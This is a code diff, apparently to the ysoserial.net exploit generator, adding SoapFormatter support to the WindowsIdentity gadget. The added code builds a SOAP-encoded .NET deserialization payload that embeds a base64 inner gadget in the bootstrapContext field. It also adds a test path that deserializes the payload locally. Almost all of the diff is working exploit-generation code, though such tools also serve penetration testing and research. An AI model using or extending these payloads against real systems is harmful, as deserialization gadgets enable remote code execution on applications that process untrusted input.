@@ -6,6 +6,7 @@ using System.Security.Claims;
 using System.Security.Principal;
 using System.Xml;
 using Newtonsoft.Json;
+using System.Runtime.Serialization.Formatters.Soap;
 
 namespace ysoserial.Generators
 {
@@ -32,7 +33,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer" };
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "SoapFormatter"};
         }
 
         public override string Name()
@@ -108,6 +109,32 @@ namespace ysoserial.Generators
                         XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                         var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                         var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("soapformatter"))
+            {
+                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
+<SOAP-ENV:Body>
+    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+      <System.Security.ClaimsIdentity.bootstrapContext xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
+    </a1:WindowsIdentity>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+";
+
+                if (test)
+                {
+                    try
+                    {
+                        byte[] byteArray = System.Text.Encoding.ASCII.GetBytes(payload);
+                        MemoryStream ms = new MemoryStream(byteArray);
+                        SoapFormatter sf = new SoapFormatter();
+                        sf.Deserialize(ms);
                     }
                     catch
                     {
